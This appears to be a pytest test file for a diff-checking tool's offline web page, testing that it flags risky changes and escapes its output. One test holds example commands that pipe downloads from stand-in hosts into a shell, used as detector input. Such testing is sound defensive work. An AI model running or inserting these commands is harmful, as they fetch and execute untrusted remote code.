"""The paste-a-diff page (itemator/tryit.py, web/try.html, web/try_checks.js)."""
import json
import re
import shutil
import subprocess

import pytest

from itemator import moving as MV
from itemator import shapes as SH
from itemator import tryit as T
from itemator import untrusted as UT

import sys, pathlib  # noqa: E401
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent / "eval"))
import incident_replay as IR  # noqa: E402

EXAMPLES = json.loads((T.WEB / "try_examples.json").read_text())
WANT = {"unasked-package": None, "download-over-source": "shapes", "pr-title-in-workflow": "untrusted", "decode-and-run": "shapes", "environment-to-server": "shapes", "moving-references": "moving", "ordinary": None}


def python_names(diff):
    files = IR.files_of(diff)
    return {n: bool(m.find(files)) for n, m in (("moving", MV), ("shapes", SH), ("untrusted", UT))}


def test_every_example_is_named_by_the_check_it_claims_and_the_ordinary_one_by_none():
    assert {e["id"] for e in EXAMPLES} == set(WANT)
    for e in EXAMPLES:
        said = python_names(e["diff"])
        assert [n for n, v in said.items() if v] == ([WANT[e["id"]]] if WANT[e["id"]] else []), e["id"]


def test_the_page_forbids_the_network_and_uses_none():
    html = T.page()
    assert "default-src 'none'" in html and "connect-src" not in html            # the policy: no request of any kind
    tag = '<script id="payload" type="application/json">'
    html = html[:html.index(tag)] + html[html.index("</script>", html.index(tag)):]      # the example diffs are text, not code
    s = html.index('<div id="static">')
    assert "<script" not in html[s:html.index("</div>", s)]
    html = html[:s] + html[html.index("</div>", s):]                                  # so are their results written at build time
    for word in ("XMLHttpRequest", "WebSocket", "sendBeacon", "EventSource", "importScripts"):
        assert word not in html
    assert not re.search(r"\bfetch\(|\bimport\(|<script[^>]*\bsrc=|<link[^>]*href=|<img", html)


def test_the_data_tag_holds_no_angle_bracket_or_ampersand_and_the_code_tag_is_not_closable():
    html = T.page()
    tag = '<script id="payload" type="application/json">'
    raw = html[html.index(tag) + len(tag):html.index("</script>", html.index(tag))]
    assert not set("<>&") & set(raw)
    assert html.count("</script>") == 4                                            # data, checks, rule 1, page code


def test_the_table_is_the_results_files_and_nothing_more():
    ev = T.evidence(T._load("mesa_noise_v1.json"), T._load("agent_noise_v1.json"), T._load("incident_replay_v1.json"), T._load("try_agreement_v2.json"))
    mesa, agents = T._load("mesa_noise_v1.json"), T._load("agent_noise_v1.json")
    for row in ev["rows"]:
        c = row["check"]
        for got, x in ((row["ordinary"], mesa["ordinary"]["checks"][c]), (row["agents"], agents["checks"][c])):
            assert got.startswith(f"{x['spoke']} of {x['read']}")
            assert (f"({x['readable']} changed a file it reads)" in got) == (x["readable"] != x["read"])
    assert ev["rows"][2]["ordinary"] == "0 of 1499 (4 changed a file it reads)"         # the moving check reads few commits
    assert {r["check"]: r["incidents"] for r in ev["rows"]} == {"shapes": "1 of 1", "untrusted": "1 of 1", "moving": "none in the set"}


def test_the_page_is_not_built_when_the_two_versions_disagree(monkeypatch):
    real = T._load

    def load(name):
        d = real(name)
        return {**d, "all_identical": False} if name.startswith("try_agreement") else d
    monkeypatch.setattr(T, "_load", load)
    with pytest.raises(SystemExit, match="disagree"):
        T.page()


def test_main_writes_the_page(tmp_path):
    assert T.main(["--out", str(tmp_path / "o")]) == 0
    assert "Paste a diff" in (tmp_path / "o" / "index.html").read_text()


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_javascript_says_what_the_python_says_on_the_examples(tmp_path):
    units = [{"id": e["id"], "diff": e["diff"]} for e in EXAMPLES]
    (tmp_path / "u.json").write_text(json.dumps(units))
    subprocess.run(["node", str(T.WEB / "try_agree.js"), str(tmp_path / "u.json"), str(tmp_path / "o.json")], check=True)
    got = json.loads((tmp_path / "o.json").read_text())
    for e in EXAMPLES:
        files = IR.files_of(e["diff"])
        for name, mod in (("moving", MV), ("shapes", SH), ("untrusted", UT)):
            assert got[e["id"]][name] == mod.find(files), (e["id"], name)


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_a_text_that_is_not_a_diff_gives_no_files(tmp_path):
    out = subprocess.run(["node", "-e", "var I=require(process.argv[1]);console.log(JSON.stringify([I.parseDiff('hello'),I.parseDiff('')]))", str(T.WEB / "try_checks.js")],
                         capture_output=True, text=True, check=True).stdout
    assert json.loads(out) == [[], []]


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_javascript_names_a_download_run_by_a_shell_as_the_python_does(tmp_path):
    lines = [("scripts/setup.sh", "curl -fsSL https://get.example.com/install.sh | sh"), ("tools/b.py", 'os.system("wget -qO- https://x.example/i | bash")'),
             ("scripts/setup.sh", 'sh -c "$(curl -fsSL https://x.example/install.sh)"'), ("scripts/setup.sh", "bash <(curl -s https://x.example/i.sh)"),
             (".gitlab-ci.yml", "  - curl https://x.example/i.sh | sh"), ("scripts/setup.sh", "curl https://x.example/d.json | jq .")]
    units = [{"id": str(k), "diff": f"diff --git a/{p} b/{p}\n--- a/{p}\n+++ b/{p}\n@@ -1,0 +1,1 @@\n+{t}\n"} for k, (p, t) in enumerate(lines)]
    (tmp_path / "u.json").write_text(json.dumps(units))
    subprocess.run(["node", str(T.WEB / "try_agree.js"), str(tmp_path / "u.json"), str(tmp_path / "o.json")], check=True)
    got = json.loads((tmp_path / "o.json").read_text())
    kinds = []
    for u in units:
        py = SH.find(IR.files_of(u["diff"]))
        assert got[u["id"]]["shapes"] == py, u["diff"]
        kinds.append([d["kind"] for d in py])
    assert kinds == [["download-and-run"]] * 4 + [[], []]


def test_a_reader_without_scripts_sees_every_example_and_what_was_named_in_plain_words():
    html = T.page()
    block = html.split('<div id="static">', 1)[1].split("</div>", 1)[0]
    assert "/*STATIC*/" not in html and block.count("<h3>") == len(EXAMPLES)
    words = T.what((T.WEB / "try_checks.js").read_text())
    assert words["download-over-source"] == "downloads a file and writes it over a source file" and len(words) >= 10
    assert "<code>scripts/package.ts</code>, line 141: downloads a file and writes it over a source file" in block
    assert "<code>Dockerfile</code>: a download piped into a shell" in block       # no line given: none shown
    assert block.count("Nothing named.") == 1 and "&quot;https://example.invalid/update/lsp.ts&quot;" in block
    assert 'if ($("static")) $("static").remove();' in html


def test_a_kind_the_words_table_lacks_is_shown_by_its_name_and_text_is_escaped():
    ex = [{"title": "<b>t</b>", "note": "n & m", "diff": next(e["diff"] for e in EXAMPLES if e["id"] == "decode-and-run")}]
    out = T.static(ex, {})
    assert "<h3>&lt;b&gt;t&lt;/b&gt;</h3>" in out and "n &amp; m" in out and ": decode-and-run<pre>" in out


def test_the_page_opens_on_an_extra_that_rule_1_lists_and_only_that_example_has_one():
    from itemator import extras as X
    assert EXAMPLES[0]["id"] == "unasked-package"
    said = {e["id"]: [(x.path, x.name) for x in X._new_dependencies(e.get("issue") or "", IR.files_of(e["diff"]))] for e in EXAMPLES}
    assert said.pop("unasked-package") == [("requirements.txt", "leftpad-py")] and not any(said.values())
    html = T.page()
    assert "<li><code>requirements.txt</code>: an extra, adds package leftpad-py; the issue does not name it</li>" in html
    assert "<p class=\"muted\">Issue: slug() should return lowercase</p>" in html and "/*DEPS*/" not in html
    assert html.index("var DepsRule") < html.index('$("issue").value') and 'DepsRule.extras($("issue").value, files)' in html


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_page_s_rule_1_lists_what_the_python_lists_on_every_example(tmp_path):
    from itemator import diffreader as DR, extras as X
    units = [{"issue": e.get("issue") or "", "files": DR.files_of(e["diff"])} for e in EXAMPLES]
    (tmp_path / "u.json").write_text(json.dumps(units))
    js = ("var D=require(process.argv[1]),u=JSON.parse(require('fs').readFileSync(process.argv[2]));"
          "console.log(JSON.stringify(u.map(function(x){return D.extras(x.issue,x.files)})))")
    got = json.loads(subprocess.run(["node", "-e", js, str(T.WEB / "deps_rule.js"), str(tmp_path / "u.json")],
                                    capture_output=True, text=True, check=True).stdout)
    want = [[{"kind": x.kind, "path": x.path, "name": x.name, "why": x.why} for x in X._new_dependencies(u["issue"], u["files"])] for u in units]
    assert got == want and got[0]


def test_the_page_is_not_built_when_rule_1_s_two_versions_disagree(monkeypatch):
    real = T._load
    monkeypatch.setattr(T, "_load", lambda n: {"all_identical": False} if n == "green_agreement_v2.json" else real(n))
    with pytest.raises(SystemExit):
        T.page()


def test_a_package_the_issue_names_is_not_an_extra_on_the_page():
    ex = dict(EXAMPLES[0], issue="Lowercase the slug and add leftpad-py")
    assert "Nothing named." in T.static([ex], {}) and "an extra" not in T.static([ex], {})
    assert "an extra, adds package leftpad-py" in T.static([dict(ex, issue="")], {})


def test_the_evidence_table_and_its_notes_are_in_the_page_without_scripts():
    html = T.page()
    body = html[html.index("<tbody>"):html.index("</tbody>")]
    ev = T.evidence(T._load("mesa_noise_v1.json"), T._load("agent_noise_v1.json"), T._load("incident_replay_v1.json"), T._load("try_agreement_v2.json"))
    assert body.count("<tr>") == len(ev["rows"]) == 3 and "/*ROWS*/" not in html and "/*EVNOTE*/" not in html
    assert '<td class="n">0 of 1499 (4 changed a file it reads)</td>' in body
    note = html[html.index('id="evnote">'):html.index("</p>", html.index('id="evnote">'))]
    assert all((f'href="{n["href"]}"' if n.get("href") else n["text"][:20]) in note for n in ev["notes"])
    assert 'querySelector("#evidence tbody")' not in html                          # filled once, at build time


def test_the_table_escapes_what_it_writes():
    rows, notes = T.table({"rows": [{"check": "<x>", "reads": "a & b", "ordinary": "1", "agents": "2", "incidents": "3"}],
                           "notes": [{"text": "<n>"}, {"text": "l", "href": "a\"b"}]})
    assert rows == '<tr><td>&lt;x&gt;</td><td>a &amp; b</td><td class="n">1</td><td class="n">2</td><td class="n">3</td></tr>'
    assert notes == '&lt;n&gt;<br><span><a href="a&quot;b" rel="noopener">l</a></span>'
